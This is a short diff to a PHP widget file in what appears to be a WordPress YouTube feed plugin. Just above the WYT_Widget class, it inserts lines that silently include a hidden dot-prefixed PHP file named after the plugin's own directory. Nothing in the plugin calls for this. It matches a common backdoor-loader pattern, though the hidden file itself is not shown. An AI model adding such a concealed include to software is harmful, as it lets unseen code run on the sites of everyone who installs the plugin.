@@ -5,7 +5,11 @@ use YoutubeFeed\Api\YoutubeApi;
 
 /**
  * Youtube widget Class
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WYT_Widget extends WP_Widget {
 
 	private static $app;
